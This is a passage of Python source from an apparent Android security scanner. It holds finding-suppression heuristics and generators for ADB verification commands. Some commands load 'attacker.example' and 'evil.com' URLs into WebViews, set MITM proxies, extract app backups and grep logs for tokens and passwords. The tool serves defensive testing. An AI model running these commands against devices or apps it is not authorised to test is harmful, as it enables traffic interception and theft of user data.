        """Check if context requirements are met around a match.

        within_lines=0 means only examine the matched line itself (useful for
        comment-exclusion rules where we only care about the current line).
        """
        lines = text.splitlines()
        line_num = text[:match_pos].count('\n')
        w = max(0, context.within_lines)
        start_line = max(0, line_num - w)
        end_line = min(len(lines), line_num + w + 1)
        context_text = '\n'.join(lines[start_line:end_line])

        # Check must_contain
        for required in context.must_contain:
            if required not in context_text:
                return False

        # Check must_not_contain
        for forbidden in context.must_not_contain:
            if forbidden in context_text:
                return False

        return True

    def _is_comment_line(self, text: str, match_pos: int) -> bool:
        """Return True if the matched line is a Java/Kotlin comment (// or * or /*)."""
        lines = text.splitlines()
        line_num = text[:match_pos].count('\n')
        if line_num >= len(lines):
            return False
        stripped = lines[line_num].lstrip()
        return stripped.startswith('//') or stripped.startswith('*') or stripped.startswith('/*')

    def _has_selection_args_nearby(self, text: str, match_pos: int, window: int = 15) -> bool:
        """Return True if a parameterized query pattern is found within *window* lines.

        Detects: selectionArgs usage, '?' bind placeholders, or ContentValues
        (all indicate the developer is using safe parameterized queries).
        """
        lines = text.splitlines()
        line_num = text[:match_pos].count('\n')
        start = max(0, line_num - window)
        end = min(len(lines), line_num + window + 1)
        ctx = "\n".join(lines[start:end])
        return (
            "selectionArgs" in ctx
            or "bindArgs" in ctx
            or 'new String[]{"?"}' in ctx
            or '"?"' in ctx
        )

    def _has_validation_guard_nearby(self, text: str, match_pos: int, window: int = 15) -> bool:
        """Return True if a validation or whitelist guard appears near the match.

        Used to suppress intent-redirect and deeplink findings where the
        developer is explicitly validating the input before using it.
        """
        _GUARDS = (
            "validate", "isValid", "isAllowed", "whitelist", "allowedComponents",
            "allowedSchemes", "allowedHosts", "checkCallingPermission",
            "enforcePermission", "getCallingPackage", "verify(", "sanitize",
        )
        lines = text.splitlines()
        line_num = text[:match_pos].count('\n')
        start = max(0, line_num - window)
        end = min(len(lines), line_num + window + 1)
        ctx = "\n".join(lines[start:end]).lower()
        return any(g.lower() in ctx for g in _GUARDS)

    # ADB command generators
    def _adb_commands_component(self, tag: str, comp: ET.Element) -> List[str]:
        """Generate ADB commands for a specific component."""
        pkg = self.package_name or "<package>"
        name = self._get_android_attr(comp, "name") or ".<Component>"
        if name.startswith("."):
            component = f"{pkg}{name}"
        elif "." in name:
            component = name
        else:
            component = f"{pkg}.{name}"

        if tag in ("activity", "activity-alias"):
            return [f"{self.adb_path} shell am start -n {pkg}/{component}"]
        if tag == "service":
            return [f"{self.adb_path} shell am startservice -n {pkg}/{component}"]
        if tag == "receiver":
            action = self._first_intent_action(comp) or "android.intent.action.TEST"
            return [f"{self.adb_path} shell am broadcast -n {pkg}/{component} -a {action}"]
        if tag == "provider":
            authority = self._get_android_attr(comp, "authorities") or "<authority>"
            return [f"{self.adb_path} shell content query --uri content://{authority}/"]
        return []

    def _first_intent_action(self, comp: ET.Element) -> Optional[str]:
        """Get the first intent action from a component."""
        intent_filter = comp.find("intent-filter")
        if intent_filter is None:
            return None
        action = intent_filter.find("action")
        if action is None:
            return None
        return self._get_android_attr(action, "name")

    def _adb_commands_debuggable(self) -> List[str]:
        pkg = self.package_name or "<package>"
        return [
            f"{self.adb_path} shell am set-debug-app -w {pkg}",
            f"{self.adb_path} shell run-as {pkg} ls -la /data/data/{pkg}/",
            f"{self.adb_path} shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1",
        ]

    def _adb_commands_backup(self) -> List[str]:
        pkg = self.package_name or "<package>"
        return [
            f"{self.adb_path} backup -f {pkg}.ab -apk {pkg}",
            f"# Extract: dd if={pkg}.ab bs=24 skip=1 | zlib-flate -uncompress | tar xvf -",
            f"{self.adb_path} restore {pkg}.ab",
        ]

    def _adb_commands_cleartext(self) -> List[str]:
        pkg = self.package_name or "<package>"
        return [
            f"# Set up MITM proxy (e.g., mitmproxy, Burp Suite)",
            f"{self.adb_path} shell settings put global http_proxy <proxy_ip>:8080",
            f"{self.adb_path} shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1",
        ]

    def _adb_commands_webview(self) -> List[str]:
        pkg = self.package_name or "<package>"
        return [
            f"{self.adb_path} shell am start -a android.intent.action.VIEW -d 'http://attacker.example/payload.html'",
            f"# If app handles deep links: {self.adb_path} shell am start -a android.intent.action.VIEW -d 'app://<scheme>/path?url=http://evil.com'",
            f"# Enable WebView debugging: chrome://inspect",
        ]

    def _adb_commands_tls(self) -> List[str]:
        pkg = self.package_name or "<package>"
        return [
            f"# Set up MITM proxy with TLS interception",
            f"{self.adb_path} shell settings put global http_proxy 127.0.0.1:8080",
            f"{self.adb_path} reverse tcp:8080 tcp:8080",
            f"{self.adb_path} shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1",
            f"# If certificate pinning is bypassed, traffic will be captured",
        ]

    def _adb_commands_logcat(self) -> List[str]:
        pkg = self.package_name or "<package>"
        return [
            f"{self.adb_path} shell logcat --pid=$({self.adb_path} shell pidof {pkg})",
            f"# Filter for sensitive data: {self.adb_path} logcat | grep -iE 'token|password|secret|auth'",
        ]

    def _adb_commands_component_generic(self) -> List[str]:
        pkg = self.package_name or "<package>"
        return [
            f"# List exported components: {self.adb_path} shell dumpsys package {pkg} | grep -A5 'exported=true'",
            f"{self.adb_path} shell am start -n {pkg}/<activity>",
        ]

    def _adb_commands_general_launch(self) -> List[str]:
        pkg = self.package_name or "<package>"
        return [
            f"{self.adb_path} shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1",
        ]

    def _deduplicate_findings(self, findings: List[Finding]) -> List[Finding]:
        """Remove duplicate findings (same issue at same location)."""
        seen = set()
        unique = []

        for finding in findings:
            file_path = finding.evidence.file_path if finding.evidence else ''
            line = finding.evidence.line_number if finding.evidence else 0

            # Always include line number in the key to preserve distinct
            # occurrences of the same vulnerability at different locations.
            # Use the base pattern id (strip the path/offset suffix) so that
            # two different regex sub-patterns for the same rule that fire on
            # the same line are still collapsed.
            fid_base = finding.fid.split(':')[0] if finding.fid else finding.title
            key = (fid_base, file_path, line)

            if key not in seen:
                seen.add(key)
                unique.append(finding)

        return unique

    @property
    def pattern_stats(self) -> dict:
        """Get statistics about loaded patterns."""
        return self._pattern_manager.stats
